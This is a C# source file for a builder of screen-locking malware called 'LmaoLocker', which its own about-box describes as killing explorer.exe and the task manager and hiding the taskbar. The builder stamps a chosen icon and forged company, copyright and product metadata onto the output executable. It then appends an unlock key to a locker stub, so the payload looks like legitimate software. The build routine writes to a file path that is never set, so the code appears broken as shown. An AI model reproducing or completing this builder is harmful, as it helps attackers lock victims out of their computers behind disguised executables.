using dnlib.DotNet;
using Microsoft.VisualBasic;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Vestris.ResourceLib;
/*
 
    Coded by Skofos, Written in C#.
    GitHub: https://github.com/Skofos
    Thanks for Vistting :D 

     */
namespace LmaoLocker
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }
        #region 2 shit checkbox at the bottom lmao
        void rainStart()
        {
            Random randbow = new Random();
            int r = randbow.Next(0, 255);
            int g = randbow.Next(0, 255);
            int b = randbow.Next(0, 255);
            Color lmaoColor = Color.FromArgb(r, g, b);

            // Main Tab
            keyLabel.ForeColor = lmaoColor;
            iconLabel.ForeColor = lmaoColor;
            iconButton.ForeColor = lmaoColor;
            keyBox.ForeColor = lmaoColor;
            iconBox.ForeColor = lmaoColor;

            // Assembly Tab
            assemblyLabel.ForeColor = lmaoColor;
            assPro.ForeColor = lmaoColor;
            proBox.ForeColor = lmaoColor;
            assDes.ForeColor = lmaoColor;
            desBox.ForeColor = lmaoColor;
            assCom.ForeColor = lmaoColor;
            comBox.ForeColor = lmaoColor;
            assCopy.ForeColor = lmaoColor;
            copyBox.ForeColor = lmaoColor;
            assTrade.ForeColor = lmaoColor;
            tradeBox.ForeColor = lmaoColor;
            assOri.ForeColor = lmaoColor;
            oriBox.ForeColor = lmaoColor;
            assProVer.ForeColor = lmaoColor;
            proverBox.ForeColor = lmaoColor;
            assFileVer.ForeColor = lmaoColor;
            fileverBox.ForeColor = lmaoColor;

            //Build Tab
            buildButton.ForeColor = lmaoColor;

            // Footer
            checkBox1.ForeColor = lmaoColor; 
            checkBox2.ForeColor = lmaoColor; 
            button1.ForeColor = lmaoColor; 
        }
        void rainStop()
        {
            Color shit = Color.Black;

            //Main Tab
            keyLabel.ForeColor = shit;
            iconLabel.ForeColor = shit;
            iconButton.ForeColor = shit;
            keyBox.ForeColor = shit; 
            iconBox.ForeColor = shit; 

            //Assembly Tab
            assemblyLabel.ForeColor = shit; 
            assPro.ForeColor = shit; 
            proBox.ForeColor = shit; 
            assDes.ForeColor = shit; 
            desBox.ForeColor = shit; 
            assCom.ForeColor = shit; 
            comBox.ForeColor = shit; 
            assCopy.ForeColor = shit; 
            copyBox.ForeColor = shit; 
            assTrade.ForeColor = shit;
            tradeBox.ForeColor = shit;
            assOri.ForeColor = shit;
            oriBox.ForeColor = shit;
            assProVer.ForeColor = shit; 
            proverBox.ForeColor = shit; 
            assFileVer.ForeColor = shit; 
            fileverBox.ForeColor = shit; 

            // Build Tab
            buildButton.ForeColor = shit; 

            // Footer
            checkBox1.ForeColor = shit; 
            checkBox2.ForeColor = shit; 
            button1.ForeColor = shit;
        }

        private void checkBox1_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBox1.Checked == true)
            {
                this.TopMost = true;
            }
            else if (checkBox1.Checked == false)
            {
                this.TopMost = false;
            }
        }
        private void checkBox2_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBox2.Checked == true)
            {
                rainbowshit.Start();
            }
            else
            {
                rainbowshit.Stop();
                rainStop();
            }
        }
        private void rainbowshit_Tick(object sender, EventArgs e)
        { 
            rainStart();
        }

        #endregion

        private void button1_Click(object sender, EventArgs e)
        {
            DialogResult kek = MessageBox.Show("My first simple malware that lock the computer screen. by killing explorer.exe, taskmngr.exe, and hide the Taskbar :D. thanks for using this!", "Skofos", MessageBoxButtons.OK, MessageBoxIcon.Information);
            if (kek == DialogResult.OK)
            {
                Process.Start("https://arrezun.my.id");
            }
        }
        private void Assembly(string kek)
        {
            VersionResource vr = new VersionResource();
            vr.LoadFrom(kek);

            vr.FileVersion = fileverBox.Text;
            vr.ProductVersion = proverBox.Text;
            vr.Language = 0;

            StringFileInfo Sfi = (StringFileInfo)vr["StringFileInfo"];
            Sfi["ProductName"] = proBox.Text;
            Sfi["FileDescription"] = desBox.Text;
            Sfi["CompanyName"] = comBox.Text;
            Sfi["LegalCopyright"] = copyBox.Text;
            Sfi["LegalTrademarks"] = tradeBox.Text;
            Sfi["Assembly Version"] = vr.ProductVersion;
            Sfi["InternalName"] = oriBox.Text;
            Sfi["OriginalFilename"] = oriBox.Text;
            Sfi["ProductVersion"] = vr.ProductVersion;
            Sfi["FileVersion"] = vr.ProductVersion;

            vr.SaveTo(kek);
        }

        private void iconButton_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog ofd = new OpenFileDialog())
            {
                ofd.Title = "Choose your Icon";
                ofd.Filter = "Icons| *.ico";
                ofd.Multiselect = false;
                if (ofd.ShowDialog() == DialogResult.OK)
                {
                    iconBox.Text = ofd.FileName;
                    iconImage.ImageLocation = ofd.FileName;
                }
            }
        }

        private void buildButton_Click(object sender, EventArgs e)
        {
            using(SaveFileDialog lmao = new SaveFileDialog())
            {
                lmao.Filter = "Executables|*.exe";
                if(lmao.ShowDialog() == DialogResult.OK)
                {
                    IconInjector.InjectIcon(lmao.FileName, iconBox.Text);
                    if(checkBox3.Checked)
                    {
                        Assembly(lmao.FileName);
                    }
                    BuildLmao();
                }
            }
        }
        public static string File;
        public static string somethingshit = "||||SPLITTTT||||";
        private void BuildLmao()
        {
            string key = keyBox.Text;

            string myresourcefullPath;
            myresourcefullPath = "LmaoLock!.exe";

            FileSystem.FileOpen(1, myresourcefullPath, OpenMode.Binary, OpenAccess.Read);
            string data = Strings.Space(Convert.ToInt32(FileSystem.LOF(1)));
            FileSystem.FileGet(1, ref data);

            FileSystem.FileClose(1);


            FileSystem.FileOpen(2, File, OpenMode.Binary, OpenAccess.Default);
            FileSystem.FilePut(2, data + somethingshit + key);
            FileSystem.FileClose(2);
        }

        private void checkBox3_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBox3.Checked == true)
            {
                proBox.Enabled = true;
                desBox.Enabled = true;
                comBox.Enabled = true;
                copyBox.Enabled = true;
                tradeBox.Enabled = true;
                oriBox.Enabled = true;
                proverBox.Enabled = true;
                fileverBox.Enabled = true;
            }
            else if (checkBox3.Checked == false)
            {
                proBox.Enabled = false;
                desBox.Enabled = false;
                comBox.Enabled = false; 
                copyBox.Enabled = false;
                tradeBox.Enabled = false;
                oriBox.Enabled = false;
                proverBox.Enabled = false;
                fileverBox.Enabled = false;
            }
        }
    }
}
